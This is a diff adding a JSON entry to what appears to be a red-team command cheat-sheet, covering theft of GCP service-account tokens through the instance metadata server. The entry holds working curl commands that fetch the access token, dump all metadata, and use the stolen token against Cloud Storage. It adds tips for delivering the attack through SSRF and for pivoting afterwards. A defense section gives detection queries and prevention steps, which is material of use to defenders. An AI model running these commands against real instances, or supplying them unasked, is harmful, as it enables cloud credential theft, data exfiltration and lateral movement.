@@ -1,0 +1,104 @@
+{
+  "id": "gcp-compute-metadata-ssrf",
+  "name": "GCP Compute Metadata SSRF - Steal SA Access Tokens",
+  "command": "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+  "description": "Abuse an SSRF primitive (or a shell) on a GCP Compute Engine / GKE / Cloud Run instance to query metadata.google.internal and steal the attached service account's OAuth access token. GCP requires the header Metadata-Flavor: Google (and rejects X-Forwarded-For), so a usable SSRF must set custom headers; the stolen token grants the SA's permissions until it expires.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Cloud Security",
+  "subcategory": "GCP Attacks",
+  "certifications": [
+    "MCRTA"
+  ],
+  "primary_cert": "MCRTA",
+  "source": "hackingthe.cloud / GCP docs",
+  "tags": [
+    "gcp",
+    "metadata",
+    "ssrf",
+    "service-account",
+    "token",
+    "compute-engine",
+    "169.254.169.254"
+  ],
+  "mitre": [
+    "T1552.005",
+    "T1078.004"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE TARGET ===\n  metadata.google.internal (169.254.169.254) serves the attached SA's token.\n  MANDATORY header: Metadata-Flavor: Google (no header = refused). This is\n  what makes GCP SSRF harder than AWS IMDSv1.\n\n=== STEAL THE SA TOKEN (direct / shell) ===\n  curl -s -H 'Metadata-Flavor: Google' \\\n    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'\n  # -> {\"access_token\":\"ya29...\",\"expires_in\":...,\"token_type\":\"Bearer\"}\n\n=== USEFUL METADATA PATHS ===\n  .../default/email       # which SA is attached\n  .../default/scopes      # OAuth scopes\n  .../v1/project/project-id\n  .../v1/instance/attributes/   # startup-script, ssh-keys, custom attrs\n  # recursive dump:\n  curl -s -H 'Metadata-Flavor: Google' \\\n    'http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json'\n\n=== USE THE STOLEN TOKEN ===\n  TOKEN=ya29...\n  curl -H \"Authorization: Bearer $TOKEN\" \\\n    'https://storage.googleapis.com/storage/v1/b?project=<project>'\n  gcloud config set auth/access_token_file <hash_file>   # or use via REST\n\n=== SSRF DELIVERY (web app that fetches a URL) ===\n  Need to force the Metadata-Flavor header: gopher://, header-injection,\n  or an app that forwards custom headers. v0.1/v1beta1 legacy endpoints\n  did NOT require the header on old images.\n\n=== NEXT ===\n  Token -> enumerate project with the SA; pivot to impersonation / deploy.",
+  "examples": [
+    {
+      "label": "Steal the attached SA access token",
+      "command": "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'"
+    },
+    {
+      "label": "Recursive metadata dump (startup script, keys)",
+      "command": "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json'"
+    },
+    {
+      "label": "Use the token against Cloud Storage",
+      "command": "curl -H 'Authorization: Bearer <token>' 'https://storage.googleapis.com/storage/v1/b?project=<project>'"
+    }
+  ],
+  "references": [
+    {
+      "title": "hackingthe.cloud - GCP metadata SSRF",
+      "url": "https://hackingthe.cloud/gcp/general-knowledge/gcp-metadata-ssrf/"
+    },
+    {
+      "title": "GCP docs - Querying metadata (default SA token)",
+      "url": "https://cloud.google.com/compute/docs/metadata/querying-metadata"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "gcp-metadata-token",
+      "note": "Core metadata-token retrieval technique.",
+      "rel": "alternative"
+    },
+    {
+      "id": "gcp-iam-enum",
+      "note": "Enumerate what the stolen SA token can do.",
+      "rel": "next"
+    },
+    {
+      "id": "ssrf-exploit",
+      "note": "General SSRF exploitation to reach the metadata host.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The metadata server hands any local process the attached SA's OAuth token on request. GCP's required Metadata-Flavor: Google header blocks naive SSRF, but a shell or a header-capable SSRF retrieves the token, inheriting the SA's permissions for the token's lifetime.",
+    "prerequisites": "An SSRF that can set the Metadata-Flavor header (or a legacy v0.1/v1beta1 image that did not require it), or any code execution on the instance; an attached service account with meaningful scopes/roles.",
+    "impact": "Theft of the instance SA's access token, granting its project permissions (often Cloud Storage, Compute, or broader) and enabling lateral movement, data exfiltration, and further privesc.",
+    "detection": "[MITRE T1552.005] Cloud Audit Logs showing the instance SA's token used from an IP outside the instance/project egress; API calls the SA has never made; VPC egress to unexpected destinations after a web request; the web app's logs show fetches to metadata.google.internal.",
+    "artifacts": "Audit log entries with authenticationInfo.principalEmail = the instance SA used from an external callerIp; application logs with outbound requests to 169.254.169.254 / metadata.google.internal; GKE/Cloud Run request logs.",
+    "splunk_spl": "index=gcp protoPayload.authenticationInfo.principalEmail=\"*gserviceaccount.com\"\n| stats dc(protoPayload.requestMetadata.callerIp) as ips values(protoPayload.methodName) as methods by protoPayload.authenticationInfo.principalEmail\n| where ips>1",
+    "elastic_kql": "gcp.audit.authentication_info.principal_email:*gserviceaccount.com and not source.ip:(10.0.0.0/8 or 172.16.0.0/12)",
+    "sentinel_kql": "GCPAuditLogs\n| where PrincipalEmail endswith \"gserviceaccount.com\"\n| summarize IPs=dcount(CallerIp), Methods=make_set(MethodName) by PrincipalEmail\n| where IPs > 1",
+    "sigma_rules": "gcp_instance_sa_token_used_externally",
+    "prevention": "Fix the SSRF (deny link-local/metadata ranges, do not forward arbitrary headers); use GKE Workload Identity instead of node SA tokens; disable legacy v0.1/v1beta1 metadata endpoints (disable-legacy-endpoints=true); attach least-privilege SAs with minimal scopes; set VPC Service Controls and egress firewall rules; alert on SA token use from outside the project.",
+    "sources": [
+      "https://hackingthe.cloud/gcp/general-knowledge/gcp-metadata-ssrf/",
+      "https://cloud.google.com/compute/docs/metadata/querying-metadata"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Instance service-account token used from an external IP",
+        "logic": "GCPAuditLogs\n| where PrincipalEmail endswith \"gserviceaccount.com\"\n| summarize IPs=dcount(CallerIp), Methods=make_set(MethodName) by PrincipalEmail\n| where IPs > 1",
+        "data_source": "gcp-audit",
+        "attack": [
+          "T1552.005",
+          "T1078.004"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "SAs legitimately used from CI/CD or on-prem via their own egress IPs",
+        "tuning": "Baseline each instance SA's normal caller IPs; alert on new external IPs and on API methods the SA has never called"
+      }
+    ]
+  }
+}
